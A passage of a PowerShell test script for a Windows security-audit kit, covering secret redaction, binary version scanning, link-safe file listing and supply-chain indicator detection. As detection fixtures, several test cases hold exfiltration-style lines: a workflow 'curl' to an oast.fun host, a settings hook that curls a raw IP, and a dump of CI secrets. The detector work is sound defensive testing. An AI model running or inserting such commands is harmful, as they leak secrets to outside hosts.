Assert-Equal (Hide-AuditSecret "'-Dkey.pass=alpha`nbeta' -Dx=1") '<redacted> -Dx=1' 'Secret: whole single-quoted argument with LF'
Assert-Equal (Hide-AuditSecret '"-Dtoken=a\" b" "-Dfile=C:\x y"') '<redacted> "-Dfile=C:\x y"' 'Secret: whole quoted argument with escaped quote, other quoted kept'
Assert-Equal (Hide-AuditSecret '{"password": "alpha beta", "x": 1}') '{"password": <redacted>, "x": 1}' 'Secret: quoted name, quoted value (JSON)'
Assert-Equal (Hide-AuditSecret '"token"="alpha beta" y') '"token"=<redacted> y' 'Secret: quoted name, quoted value (=)'
Assert-Equal (Hide-AuditSecret "{'secret': 'alpha beta'}") "{'secret': <redacted>}" 'Secret: single-quoted name and value'
Assert-Equal (Hide-AuditSecret 'https://u:p@h/x') 'https://<redacted>@h/x' 'Secret: URL user info'
Assert-Equal (Hide-AuditSecret '') '' 'Secret: empty'
# Repository only (Install-Kit.ps1 is not part of the installed kit): both installers list the same kit files.
$installer=Join-Path $PSScriptRoot 'Install-Kit.ps1'
if (Test-Path -LiteralPath $installer) {
    $psList=[regex]::Match([IO.File]::ReadAllText($installer),'(?s)\$KitFiles = @\((.*?)\)').Groups[1].Value
    $psNames=@([regex]::Matches($psList,"'([^']+)'") | ForEach-Object { $_.Groups[1].Value } | Sort-Object)
    $shLine=[regex]::Match([IO.File]::ReadAllText((Join-Path $PSScriptRoot 'install_kit_wsl.sh')),'(?m)^KIT_FILES="([^"]+)"').Groups[1].Value
    $shNames=@($shLine -split '\s+' | Where-Object { $_ } | Sort-Object)
    Assert-Equal ($psNames.Count -gt 0) $true 'Install-Kit.ps1 kit list parsed'
    Assert-Equal ($psNames -join ',') ($shNames -join ',') 'Kit file lists match (Install-Kit.ps1 / install_kit_wsl.sh)'
}

$temp=Join-Path ([IO.Path]::GetTempPath()) ('emudhra tests ' + [guid]::NewGuid().ToString('N'))
[void][IO.Directory]::CreateDirectory($temp)
try {
    $unicode=([string][char]0x65E5)+([string][char]0x672C)
    $text="C:\$unicode path\env`n"
    $dest=Join-Path $temp 'handoff.txt'
    Write-AuditUtf8 -Path $dest -Text $text
    $bytes=[IO.File]::ReadAllBytes($dest)
    Assert-Equal ([Text.Encoding]::UTF8.GetString($bytes)) $text 'Unicode UTF8 roundtrip'
    Assert-Equal ($bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) $false 'No BOM'
    # Electron token split across a chunk boundary, plus a second token in a later chunk.
    $fakeExe=Join-Path $temp 'fake-electron.exe'
    $blob=New-Object byte[] 300
    $token=[Text.Encoding]::ASCII.GetBytes('Electron/43.7.7')
    [Array]::Copy($token,0,$blob,95,$token.Length)
    $token2=[Text.Encoding]::ASCII.GetBytes('Chrome/1.2.3 Electron/42.11.16 ')
    [Array]::Copy($token2,0,$blob,250,$token2.Length)
    [IO.File]::WriteAllBytes($fakeExe,$blob)
    Assert-Equal ((Get-AuditElectronVersion -Path $fakeExe -ChunkBytes 100) -join ',') '42.11.16,43.7.7' 'Electron token across chunks'
    # Chunk boundary inside the last digits: "Electron/42.11.1" | "6" must not yield 42.11.1.
    $cut=New-Object byte[] 200
    $token3=[Text.Encoding]::ASCII.GetBytes('Electron/42.11.16 ')
    [Array]::Copy($token3,0,$cut,100 - 16,$token3.Length)
    $cutExe=Join-Path $temp 'cut-electron.exe'
    [IO.File]::WriteAllBytes($cutExe,$cut)
    Assert-Equal ((Get-AuditElectronVersion -Path $cutExe -ChunkBytes 100) -join ',') '42.11.16' 'Electron version cut inside digits'
    Assert-Equal @(Get-AuditElectronVersion -Path $dest).Count 0 'No Electron token'
    # Bun token (Claude Code native build: "Bun v1.4.4"), alongside an Electron token, across chunks.
    $bunExe=Join-Path $temp 'fake-bun.exe'
    $bunBlob=New-Object byte[] 300
    $bt=[Text.Encoding]::ASCII.GetBytes('x Bun v1.4.4 ')
    [Array]::Copy($bt,0,$bunBlob,92,$bt.Length)
    $et=[Text.Encoding]::ASCII.GetBytes('Electron/43.8.1 ')
    [Array]::Copy($et,0,$bunBlob,200,$et.Length)
    [IO.File]::WriteAllBytes($bunExe,$bunBlob)
    $ev=Get-AuditEmbeddedVersions -Path $bunExe -ChunkBytes 100
    Assert-Equal ($ev.Bun -join ',') '1.4.4' 'Embedded Bun token across chunks'
    Assert-Equal ($ev.Electron -join ',') '43.8.1' 'Embedded Electron token next to Bun'
    # PyInstaller one-file cookie near the end (an Authenticode signature may follow it).
    $one=Join-Path $temp 'fake-onefile.exe'
    $ob=New-Object byte[] 5000; $cookie=[byte[]](0x4D,0x45,0x49,0x0C,0x0B,0x0A,0x0B,0x0E); [Array]::Copy($cookie,0,$ob,4000,8)
    [IO.File]::WriteAllBytes($one,$ob)
    Assert-Equal (Test-AuditPyInstallerOnefile -Path $one) $true 'PyInstaller one-file cookie found before trailing data'
    Assert-Equal (Test-AuditPyInstallerOnefile -Path $bunExe) $false 'No PyInstaller cookie'
    Assert-Equal (Test-AuditPyInstallerOnefile -Path $one -TailBytes 500) $false 'Cookie outside the searched tail'
    # Recursive listing that does not follow junctions.
    $tree=Join-Path $temp 'dist'; [void][IO.Directory]::CreateDirectory("$tree\sub"); [IO.File]::WriteAllBytes("$tree\sub\a.exe",[byte[]]@(1))
    $outside=Join-Path $temp 'outside'; [void][IO.Directory]::CreateDirectory($outside); [IO.File]::WriteAllBytes("$outside\b.exe",[byte[]]@(1))
    cmd /c mklink /J "$tree\link" "$outside" | Out-Null
    $le=[Collections.Generic.List[string]]::new()
    $found=@(Get-AuditFilesNoLinks -Root $tree -Filter '*.exe' -Errors $le | ForEach-Object Name)
    Assert-Equal ($found -join ',') 'a.exe' 'No-links listing does not follow a junction'
    Assert-Equal (@($le | Where-Object { $_ -like '*link, not followed' }).Count) 1 'Skipped junction is reported'
    cmd /c rmdir "$tree\link" | Out-Null
    # A file symlink to an exe outside the tree (needs Developer Mode or admin rights; skipped if it cannot be made).
    cmd /c "mklink `"$tree\linked.exe`" `"$outside\b.exe`" >nul 2>nul"   # stderr stays inside cmd (PS 5.1 would turn it into an error)
    if (Test-Path -LiteralPath "$tree\linked.exe") {
        $le2=[Collections.Generic.List[string]]::new()
        $found2=@(Get-AuditFilesNoLinks -Root $tree -Filter '*.exe' -Errors $le2 | ForEach-Object Name)
        Assert-Equal ($found2 -join ',') 'a.exe' 'No-links listing does not return a file symlink'
        Assert-Equal (@($le2 | Where-Object { $_ -like '*linked.exe : link, not followed' }).Count) 1 'Skipped file symlink is reported'
        Remove-Item -LiteralPath "$tree\linked.exe" -Force
    } else { Write-Output 'NOTE: file symlink test skipped (no privilege to create one)' }
    # Reparse tags: read without opening the file. A plain file is 0, a junction is IO_REPARSE_TAG_MOUNT_POINT.
    Assert-Equal (Get-AuditReparseTag -Path "$tree\sub\a.exe") ([uint32]0) 'Reparse tag: plain file'
    cmd /c mklink /J "$tree\link2" "$outside" | Out-Null
    Assert-Equal (Get-AuditReparseTag -Path "$tree\link2") ([Convert]::ToUInt32('A0000003',16)) 'Reparse tag: junction'
    cmd /c rmdir "$tree\link2" | Out-Null
    # Only a cloud-files tag (0x9000?01A) with local data counts as a readable file (e.g. 0x9000201A in a folder removed from OneDrive sync).
    foreach ($case in @(@('9000201A',0x420,$true),@('9000001A',0x20,$true),@('9000701A',0x420,$true),@('9000201A',0x401420,$false),
                        @('9000201A',0x1420,$false),@('9000201A',0x40420,$false),@('A000000C',0x420,$false),@('A0000003',0x410,$false),@('8000001B',0x420,$false))) {
        Assert-Equal (Test-AuditLocalCloudFile -Tag ([Convert]::ToUInt32($case[0],16)) -Attributes $case[1]) $case[2] "Local cloud file: tag $($case[0]) attributes 0x$('{0:X}' -f $case[1])"
    }
    # Read decision for the 3.2 IOC check: a local cloud file is read, a placeholder and other links are not.
    foreach ($case in @(@(0x20,'0',''), @(0x420,'9000201A',''), @(0x420,'9000001A',''), @(0x1420,'9000201A','cloud-only'), @(0x401420,'9000201A','cloud-only'),
                        @(0x40420,'9000201A','cloud-only'), @(0x1020,'0','cloud-only'), @(0x420,'A000000C','link'), @(0x410,'A0000003','link'), @(0x420,'0','link'), @(0x420,'8000001B','link'))) {
        Assert-Equal (Get-AuditReadDecision -Attributes $case[0] -Tag ([Convert]::ToUInt32($case[1],16))) $case[2] "Read decision: attributes 0x$('{0:X}' -f $case[0]) tag $($case[1])"
    }
    Assert-Equal (Get-AuditReadSkipReason -Item (Get-Item -LiteralPath "$tree\sub\a.exe")) '' 'Read skip reason: plain file is read'
    cmd /c mklink /J "$tree\link3" "$outside" | Out-Null
    Assert-Equal (Get-AuditReadSkipReason -Item (Get-Item -LiteralPath "$tree\link3" -Force)) 'link' 'Read skip reason: junction is not read'
    cmd /c rmdir "$tree\link3" | Out-Null
    # Pruned folder names are not entered and not reported; MaxDepth works like Get-ChildItem -Depth.
    $pt=Join-Path $temp 'prune'
    foreach ($p in 'node_modules\deep','NODE_MODULES2','l1\l2','l1\node_modules') { [void][IO.Directory]::CreateDirectory("$pt\$p") }
    foreach ($p in 'top.exe','node_modules\deep\nm.exe','NODE_MODULES2\keep.exe','l1\one.exe','l1\l2\two.exe','l1\node_modules\nm2.exe') { [IO.File]::WriteAllBytes("$pt\$p",[byte[]]@(1)) }
    cmd /c mklink /J "$pt\l1\node_modules_link" "$outside" | Out-Null; [void][IO.Directory]::CreateDirectory("$pt\l1\real"); cmd /c mklink /J "$pt\l1\real\node_modules" "$outside" | Out-Null
    $pe=[Collections.Generic.List[string]]::new()
    Assert-Equal ((@(Get-AuditFilesNoLinks -Root $pt -Filter '*.exe' -Errors $pe -PruneDirectoryName @('Node_Modules') | ForEach-Object Name) | Sort-Object) -join ',') 'keep.exe,one.exe,top.exe,two.exe' 'No-links listing: pruned names at any level, case-insensitive'
    # A pruned name is skipped silently even when it is a junction; a junction with another name is reported.
    Assert-Equal (($pe | ForEach-Object { [IO.Path]::GetFileName(($_ -split ' : ')[0]) }) -join ',') 'node_modules_link' 'No-links listing: pruned folders (even links) are not reported; other links are'
    cmd /c rmdir "$pt\l1\node_modules_link" | Out-Null; cmd /c rmdir "$pt\l1\real\node_modules" | Out-Null
    Assert-Equal ((@(Get-AuditFilesNoLinks -Root $pt -Filter '*.exe' -MaxDepth 0 | ForEach-Object Name) | Sort-Object) -join ',') 'top.exe' 'No-links listing: MaxDepth 0 is the root only'
    Assert-Equal ((@(Get-AuditFilesNoLinks -Root $pt -Filter '*.exe' -MaxDepth 1 -PruneDirectoryName @('node_modules','NODE_MODULES2') | ForEach-Object Name) | Sort-Object) -join ',') 'one.exe,top.exe' 'No-links listing: MaxDepth 1'
    # Electron scan: no link is followed (reported instead) and a cloud-only exe is returned unread.
    $et2=Join-Path $temp 'eapps'; [void][IO.Directory]::CreateDirectory("$et2\app"); Copy-Item -LiteralPath $bunExe -Destination "$et2\app\big.exe"
    cmd /c mklink /J "$et2\linked" "$outside" | Out-Null
    $ee=[Collections.Generic.List[string]]::new()
    $ea=@(Find-AuditElectronApps -Root @($et2) -MinBytes 1 -Errors $ee)
    Assert-Equal "$($ea.Count)|$($ea[0].Electron)|$($ea[0].Bun)|$($ea[0].ReadError)" '1|43.8.1|1.4.4|' 'Electron scan reads a local exe'
    Assert-Equal (@($ee | Where-Object { $_ -like '*linked : link, not followed' }).Count) 1 'Electron scan reports a skipped junction'
    (Get-Item -LiteralPath "$et2\app\big.exe").Attributes = [IO.FileAttributes]::Offline
    $ec=@(Find-AuditElectronApps -Root @($et2) -MinBytes 1)
    Assert-Equal "$($ec.Count)|$($ec[0].Electron)|$($ec[0].ReadError)" '1||cloud-only, not read' 'Electron scan does not open a cloud-only exe'
    (Get-Item -LiteralPath "$et2\app\big.exe").Attributes = 'Normal'
    cmd /c rmdir "$et2\linked" | Out-Null
    $plain=Get-Item -LiteralPath $one
    Assert-Equal (Test-AuditCloudOnly -Item $plain) $false 'Local file is not cloud-only'
    $plain.Attributes = $plain.Attributes -bor [IO.FileAttributes]::Offline
    Assert-Equal (Test-AuditCloudOnly -Item (Get-Item -LiteralPath $one)) $true 'Offline attribute means cloud-only (not read)'
    (Get-Item -LiteralPath $one).Attributes = 'Normal'
    $preExe=Join-Path $temp 'fake-pre.exe'
    $glued=Join-Path $temp 'fake-glued.exe'
    [IO.File]::WriteAllBytes($glued,[Text.Encoding]::ASCII.GetBytes("aa Bun v1.4.4rc1 bb Electron/43.8.1.5 cc"))
    $gv=Get-AuditEmbeddedVersions -Path $glued
    Assert-Equal ($gv.Bun -join ',') '1.4.4rc1' 'Embedded Bun suffix without separator is kept'
    Assert-Equal (Compare-AuditFixedVersion $gv.Bun[0] @('1.4.4') -LineParts 0) 'UNKNOWN' 'Glued pre-release is not FIXED'
    Assert-Equal ($gv.Electron -join ',') '43.8.1.5' 'Embedded Electron extra part is kept'
    $pre=[Text.Encoding]::ASCII.GetBytes("aa Bun v1.4.4-canary.7+abc1 bb Electron/44.9.1-beta.2`0 cc")
    [IO.File]::WriteAllBytes($preExe,$pre)
    $pv=Get-AuditEmbeddedVersions -Path $preExe
    Assert-Equal ($pv.Bun -join ',') '1.4.4-canary.7+abc1' 'Embedded Bun pre-release keeps its suffix'
    Assert-Equal ($pv.Electron -join ',') '44.9.1-beta.2' 'Embedded Electron pre-release keeps its suffix'
    Assert-Equal (Compare-AuditFixedVersion $pv.Bun[0] @('1.4.4') -LineParts 0) 'UNKNOWN' 'Embedded pre-release is not FIXED'
    # Java version without running java.exe: release file (JDK 7+) and "1.x" numbering.
    foreach ($case in @(@('jre8','JAVA_VERSION="1.8.0_402"',8),@('jdk21','JAVA_VERSION="21.0.13"',21),@('jre6','',$null))) {
        $jbin=Join-Path $temp "$($case[0])\bin"; [void][IO.Directory]::CreateDirectory($jbin)
        $jexe=Join-Path $jbin 'java.exe'; [IO.File]::WriteAllBytes($jexe,[byte[]]@(0))
        if ($case[1]) { Write-AuditUtf8 -Path (Join-Path $temp "$($case[0])\release") -Text ("IMPLEMENTOR=`"x`"`n" + $case[1] + "`n") }
        $ji=Get-AuditJavaInfo -JavaExe $jexe
        Assert-Equal $ji.Major $case[2] "Java major: $($case[0])"
        Assert-Equal $ji.Cacerts '' "Java cacerts absent: $($case[0])"
    }
    # A cloud-only release file is not opened: the version stays unknown.
    $rel=Join-Path $temp 'jdk21\release'
    (Get-Item -LiteralPath $rel).Attributes = [IO.FileAttributes]::Offline
    $jc=Get-AuditJavaInfo -JavaExe (Join-Path $temp 'jdk21\bin\java.exe')
    Assert-Equal "$($jc.VersionSource)|$($jc.Major)" 'cloud-only|' 'Java: cloud-only release is not read'
    (Get-Item -LiteralPath $rel).Attributes = 'Normal'
    # Native arguments are quoted only when needed (py.exe 3.13 does not strip quotes from its own options).
    foreach ($case in @(@('--list-paths','--list-paths'),@(':all:',':all:'),@('C:\a\b\','C:\a\b\'),@('','""'),@('a b','"a b"'),
                        @('a"b','"a\"b"'),@('a\"b','"a\\\"b"'),@('C:\x y\','"C:\x y\\"'),@("a`tb","`"a`tb`""))) {
        Assert-Equal (ConvertTo-AuditNativeArgument $case[0]) $case[1] "Native argument quoting: [$($case[0])]"
    }
    # uv python list JSON: arrays are unrolled (Windows PowerShell 5.1 emits a JSON array as one object).
    $uvJson='[{"key":"a","path":"C:\\u\\a\\python.exe"},{"key":"b","path":null},{"key":"c","path":"C:\\u c\\python.exe"}]'
    $uvPaths=@(ConvertFrom-AuditUvPythonList $uvJson)
    Assert-Equal $uvPaths.Count 2 'uv list: entries without a path are skipped'
    Assert-Equal ($uvPaths -join '|') 'C:\u\a\python.exe|C:\u c\python.exe' 'uv list: one string per path'
    Assert-Equal @(ConvertFrom-AuditUvPythonList '[{"path":"C:\\one\\python.exe"}]').Count 1 'uv list: single entry'
    Assert-Equal @(ConvertFrom-AuditUvPythonList '[]').Count 0 'uv list: empty array'
    Assert-Equal @(ConvertFrom-AuditUvPythonList '').Count 0 'uv list: empty output'
    Assert-Equal @(ConvertFrom-AuditUvPythonList $null).Count 0 'uv list: null output'
    Assert-Equal @(ConvertFrom-AuditUvPythonList "  `r`n ").Count 0 'uv list: whitespace-only output'
    Assert-Equal @(ConvertFrom-AuditUvPythonList '[{"path":""},{"path":"C:\\p\\python.exe"}]').Count 1 'uv list: empty path is skipped'
    # v2.12: Brotli libraries found by name (3.2 brotli-lib-found.csv, judged in 6.4).
    foreach ($case in @(
        @('C:\Program Files\Inkscape\bin\libbrotlidec.dll','brotli-lib'), @('C:\x\LIBBROTLIDEC-1a2b3c.DLL','brotli-lib'),
        @('C:\x\site-packages\pillow_jxl_plugin.libs\libbrotlidec-0a1b2c3d.dll','brotli-lib'), @('C:\x\undocked_copilot\brotlidec.dll','brotli-lib'),
        @('C:\x\ImageMagick\CORE_RL_brotli_.dll','brotli-lib'), @('C:\x\core_rl_brotli_.dll','brotli-lib'),
        @('C:\x\libbrotlicommon.dll',''), @('C:\x\libbrotlienc.dll',''), @('C:\x\brotli.dll',''), @('C:\x\libbrotlidec.so',''),
        @('C:\Steam\bin\cef\libcef.dll','cef'), @('C:\x\Qt5WebEngineCore.dll','qtwebengine'), @('C:\x\Qt6WebEngineCore.dll','qtwebengine'),
        @('C:\x\Qt4WebEngineCore.dll',''), @('C:\x\libcef.dll.bak',''),
        @('C:\Apps\PowerToys\System.IO.Compression.Native.dll','dotnet-native'),
        @('C:\Apps\x\runtimes\win-x64\native\System.IO.Compression.Native.dll','dotnet-native'),
        @('C:\Program Files\dotnet\shared\Microsoft.NETCore.App\9.0.1\System.IO.Compression.Native.dll',''),
        @('c:\program files\DOTNET\SHARED\microsoft.netcore.app\8.0.20\system.io.compression.native.dll',''),
        @('C:\Apps\shared\Microsoft.NETCore.App\9.0.1\sub\System.IO.Compression.Native.dll','dotnet-native'),
        @('C:\Apps\shared\Microsoft.WindowsDesktop.App\9.0.1\System.IO.Compression.Native.dll','dotnet-native'))) {
        Assert-Equal (Get-AuditBrotliLibKind -Path $case[0]) $case[1] "Brotli lib kind: $($case[0])"
    }
    # Supply-chain indicators (v2.12.2): candidate kind from the path only, then the verdict from the text.
    foreach ($case in @(
        @('C:\v\Lib\site-packages\cook.pth','sitepkg-ioc'), @('C:\v\lib\python3.12\site-packages\cook.py','sitepkg-ioc'),
        @('C:\v\Lib\site-packages\litellm-1.107.0.dist-info','sitepkg-ioc'), @('C:\v\Lib\site-packages\litellm-1.106.2.dist-info',''),
        @('C:\v\Lib\cook.pth',''), @('C:\repo\.github\workflows\ci.yml','workflow'), @('C:\repo\.github\workflows\x.yaml','workflow'),
        @('C:\repo\.github\workflows\sub\x.yml',''), @('C:\repo\.github\ci.yml',''), @('C:\repo\package-lock.json','lockfile'),
        @('C:\repo\pnpm-lock.yaml','lockfile'), @('C:\repo\yarn.lock','lockfile'), @('C:\repo\bun.lock','lockfile'), @('C:\repo\package.json',''),
        @('C:\repo\.vscode\tasks.json','vscode-tasks'), @('C:\repo\.vscode\settings.json',''), @('C:\repo\.claude\settings.json','claude-settings'),
        @('C:\repo\.claude\settings.local.json','claude-settings'), @('C:\repo\node_modules\tensorlake\package.json','npm-tensorlake'),
        @('C:\repo\node_modules\other\package.json',''), @('/home/u/repo/.github/workflows/ci.yml','workflow'))) {
        Assert-Equal (Get-AuditIocCandidateKind -Path $case[0]) $case[1] "IOC kind: $($case[0])"
    }
    $iocCases=@(
        @('C:\v\Lib\site-packages\cook.pth','','HIGH'),
        @('C:\r\.github\workflows\ci.yml','run: echo ok','none'),
        @('C:\r\.github\workflows\ci.yml','run: curl https://x.oast.fun/$X','HIGH'),
        @('C:\r\.github\workflows\ci.yml','env: {S: ${{ toJSON(secrets) }}}','CHECK'),
        @('C:\r\.github\workflows\security-audit.yml','run: cargo audit','CHECK'),
        @('C:\r\package-lock.json','"node_modules/react": {"version": "19.0.0"}','none'),
        @('C:\r\package-lock.json','"node_modules/tensorlake": {"version": "0.5.143"}','CHECK'),
        @('C:\r\package-lock.json','"node_modules/tensorlake": {"version": "0.5.144",','HIGH'),
        @('C:\r\package-lock.json',"    `"node_modules/tensorlake`": {`r`n      `"version`": `"0.5.144`",`r`n      `"resolved`": `"x`"`r`n    },",'HIGH'),
        @('C:\r\package-lock.json',"    `"node_modules/tensorlake`": {`n      `"version`": `"0.5.143`"`n    },`n    `"node_modules/y`": {`n      `"version`": `"0.5.144`"`n    }",'CHECK'),
        @('C:\r\yarn.lock',"tensorlake@^0.5.0:`n  version `"0.5.144`"`n  resolved `"x`"",'HIGH'),
        @('C:\r\yarn.lock',"tensorlake@^0.5.0:`n  version `"0.5.1440`"",'CHECK'),
        @('C:\r\pnpm-lock.yaml','  /tensorlake@0.5.144:','HIGH'),
        @('C:\r\.claude\settings.json','{"note":"tensorlake"}','CHECK'),
        @('C:\r\node_modules\tensorlake\package.json','{"name":"tensorlake","version":"0.5.144"}','HIGH'),
        @('C:\r\node_modules\tensorlake\package.json','{"name":"tensorlake","version":"0.4.0"}','CHECK'),
        @('C:\r\.vscode\tasks.json','{"tasks":[{"label":"build"}]}','none'),
        @('C:\r\.vscode\tasks.json','{"runOptions": {"runOn": "folderOpen"}}','CHECK'),
        @('C:\r\.claude\settings.json','{"permissions":{"allow":["Bash(git *)"]}}','none'),
        @('C:\r\.claude\settings.json','{"hooks":{"x":[{"command":"curl 193.32.204.199"}]}}','HIGH'),
        @('C:\r\README.md','AKIA_CTX_START','none'))
    foreach ($case in $iocCases) {
        $f=Get-AuditIocFinding -Path $case[0] -Text $case[1]
        Assert-Equal $(if ($f) { $f.Level } else { 'none' }) $case[2] "IOC verdict: $($case[0]) / $($case[1])"
    }
    Assert-Equal ((Get-AuditIocFinding -Path 'C:\r\.github\workflows\ci.yml' -Text ('x'*500 + 'oast.fun')).Detail.Length -le 160) $true 'IOC detail is short'
    # The version has to belong to the package's own entry.
    $pinnedCases=@()
    foreach ($case in @(
        @("litellm==1.107.0",'litellm','1.107.0',$true), @("litellm==1.107.0.post1",'litellm','1.107.0',$false), @("litellm>=1.107.0",'litellm','1.107.0',$false), @("`"tensorlake`": {`n  `"version`": `"0.5.143`",`n  `"dependencies`": {`n    `"other`": {`n      `"version`": `"0.5.144`"`n    }`n  }`n}",'tensorlake','0.5.144',$false), @("`"tensorlake`": {`n  `"resolved`": `"x`",`n  `"version`": `"0.5.144`"`n}",'tensorlake','0.5.144',$true), @("litellm~=1.107.0",'litellm','1.107.0',$false), @("litellm = ""^1.107.0""",'litellm','1.107.0',$false), @("litellm = ""1.107.0""",'litellm','1.107.0',$true), @('"tensorlake": "^0.5.144"','tensorlake','0.5.144',$false), @('"tensorlake": "0.5.144"','tensorlake','0.5.144',$true), @("tensorlake@^0.5.144:`n  version ""0.5.144""",'tensorlake','0.5.144',$true), @("litellm==1.107.0+local",'litellm','1.107.0',$false), @("litellm==1.107.0; python_version>='3.9'",'litellm','1.107.0',$true), @("/tensorlake@0.5.144-beta.1:",'tensorlake','0.5.144',$false), @("tensorlake@^0.5.0:`n  version ""0.5.144-rc1""",'tensorlake','0.5.144',$false), @("litellm==1.106.0`nother==1.107.0",'litellm','1.107.0',$false),
        @("litellm>=1.100`nrequests",'litellm','1.107.0',$false), @("[[package]]`nname = `"litellm`"`nversion = `"1.107.0`"",'litellm','1.107.0',$true),
        @("[[package]]`nname = `"litellm`"`nversion = `"1.106.0`"`n`n[[package]]`nname = `"x`"`nversion = `"1.107.0`"",'litellm','1.107.0',$false),
        @("tensorlake@^0.5.0:`n  version `"0.5.144`"",'tensorlake','0.5.144',$true),
        @("tensorlake@^0.5.0:`n  version `"0.5.143`"`n`nother@^1:`n  version `"0.5.144`"",'tensorlake','0.5.144',$false),
        @("`"node_modules/tensorlake`": {`n  `"version`": `"0.5.144`",",'tensorlake','0.5.144',$true),
        @("`"node_modules/tensorlake`": {`n  `"license`": `"MIT`",`n  `"other`": `"0.5.144`"",'tensorlake','0.5.144',$false),
        @("`"tensorlake-extra`": `"0.5.144`"",'tensorlake','0.5.144',$false), @('{"dependencies":{"tensorlake":"0.5.143","other":"0.5.144"}}','tensorlake','0.5.144',$false), @('{"dependencies":{"tensorlake":"0.5.144","other":"1"}}','tensorlake','0.5.144',$true), @("`"tensorlake`": [`"tensorlake@0.5.144`", `"`"]",'tensorlake','0.5.144',$true))) {
        Assert-Equal (Test-AuditPinnedVersion -Text $case[0] -Package $case[1] -Version $case[2]) $case[3] "Pinned version: $($case[0] -replace "`n",' | ')"
        $pinnedCases += ,$case
    }
    # Invoke-CiAudit.ps1 keeps its own copy of the rule (it runs without the helpers): it must agree on every case
    $ciPath=Join-Path $PSScriptRoot 'Invoke-CiAudit.ps1'
    if (Test-Path -LiteralPath $ciPath) {
        $ast=[System.Management.Automation.Language.Parser]::ParseFile($ciPath, [ref]$null, [ref]$null)
        $fn=@($ast.FindAll({ param($a) $a -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $a.Name -eq 'Test-PinnedVersion' }, $true))[0]
        Assert-Equal ($null -ne $fn) $true 'Invoke-CiAudit.ps1 defines Test-PinnedVersion'
        . ([scriptblock]::Create($fn.Extent.Text))
        foreach ($case in $pinnedCases) { Assert-Equal (Test-PinnedVersion $case[0] $case[1] $case[2]) $case[3] "CI pinned version agrees: $($case[0] -replace "`n",' | ')" }
    }
    # Hash table: four distinct builds; the two FIXED ones are the DLLs Replace-GitBrotli.ps1 installs, the two VULNERABLE ones are what Git ships.
    $bk=@(Get-AuditBrotliKnownHashes)
    Assert-Equal $bk.Count 4 'Brotli known hashes: count'
    Assert-Equal @($bk.Sha256 | Select-Object -Unique).Count 4 'Brotli known hashes: distinct'
    Assert-Equal (@($bk | Where-Object { $_.Sha256 -notmatch '^[0-9a-f]{64}$' }).Count) 0 'Brotli known hashes: lowercase SHA256'
    $replaceScript=Join-Path $PSScriptRoot 'Replace-GitBrotli.ps1'
    if (Test-Path -LiteralPath $replaceScript) {
        & {
            . $replaceScript   # dot-sourced: only the functions and tables are defined
            Assert-Equal $sets['mingw64'].hash['libbrotlidec.dll'] (@($bk | Where-Object Name -eq 'MSYS2 brotli 1.2.1-1 mingw64')[0].Sha256) 'Replace-GitBrotli hash = helper table (mingw64 1.2.1)'
            Assert-Equal $sets['ucrt64'].hash['libbrotlidec.dll'] (@($bk | Where-Object Name -eq 'MSYS2 brotli 1.2.1-1 ucrt64')[0].Sha256) 'Replace-GitBrotli hash = helper table (ucrt64 1.2.1)'
            Assert-Equal (@($shippedDec['mingw64'].Keys)[0]) (@($bk | Where-Object Name -eq 'MSYS2 brotli 1.2.0 mingw64 (as shipped by Git for Windows)')[0].Sha256) 'Replace-GitBrotli shipped hash = helper table (mingw64 1.2.0)'
            Assert-Equal (@($shippedDec['ucrt64'].Keys)[0]) (@($bk | Where-Object Name -eq 'MSYS2 brotli 1.2.0 ucrt64 (as shipped by Git for Windows)')[0].Sha256) 'Replace-GitBrotli shipped hash = helper table (ucrt64 1.2.0)'
        }
    }
    function New-BrotliRow($Kind,$Path,$Cloud='False',$Fv='',$Pv='',$Note='',$Co='') { [pscustomobject]@{ FullName=$Path; Kind=$Kind; CloudOnly=$Cloud; FileVersion=$Fv; ProductVersion=$Pv; Note=$Note; CompanyName=$Co } }
    foreach ($h in $bk) {
        $v=Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'brotli-lib' 'C:\x\libbrotlidec.dll') -Sha256 $h.Sha256.ToUpperInvariant()
        Assert-Equal "$($v.Verdict)|$($v.Version)|$($v.Reason)|$($v.Known)" "$($h.Verdict)|$($h.Version)|known-hash|$($h.Name)" "Brotli lib verdict: $($h.Name)"
    }
    # A copy moved aside by Replace-GitBrotli.ps1 is INFO whatever it contains (otherwise 1.2.0 originals would count as VULNERABLE
    # and a hard-linked libexec backup holding 1.2.1 as FIXED); the known build is still named.
    $gitFake=Join-Path $temp 'FakeGit'; New-Item -ItemType Directory -Force -Path (Join-Path $gitFake 'cmd') | Out-Null; Set-Content -LiteralPath (Join-Path $gitFake 'cmd\git.exe') 'x'
    $bkNew=Join-Path $gitFake '_emudhra_backup_brotli-1.2.0-20260101-120000-0123abcd\ucrt64_bin\libbrotlidec.dll'
    foreach ($h in $bk) {
        $bv=Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'brotli-lib' $bkNew) -Sha256 $h.Sha256
        Assert-Equal "$($bv.Verdict)|$($bv.Reason)|$($bv.Known)" "INFO|backup|$($h.Name)" "Brotli lib verdict: backup of $($h.Name) is INFO"
    }
    Assert-Equal (Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'brotli-lib' (Join-Path $gitFake '_emudhra_backup_brotli-1.2.0\libbrotlidec.dll')) -Sha256 ('0' * 64)).Verdict 'INFO' 'Brotli lib verdict: v2.10-style backup with an unknown hash is INFO'
    Assert-Equal (Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'brotli-lib' (Join-Path $gitFake '_emudhra_backup_brotli-1.2.0\mingw64_libexec_git-core\libbrotlicommon.dll')) -Sha256 $bk[0].Sha256).Reason 'backup' 'Brotli lib verdict: libexec backup is INFO'
    foreach ($case in @(
        @('C:\x\my_emudhra_backup_brotli-notes\libbrotlidec.dll','a folder that only contains the word'),
        @('C:\Apps\_emudhra_backup_brotli-live\Git\mingw64\bin\libbrotlidec.dll','a live Git below a folder with the name'),
        @((Join-Path $gitFake '_emudhra_backup_brotli-1.2.0\deep\er\libbrotlidec.dll'),'a deeper folder than the script makes'),
        @((Join-Path $temp 'NoGit\_emudhra_backup_brotli-1.2.0\libbrotlidec.dll'),'a parent without cmd\git.exe'),
        @((Join-Path $gitFake '_emudhra_backup_brotli-1.2.0\brotlidec.dll'),'another file name'))) {
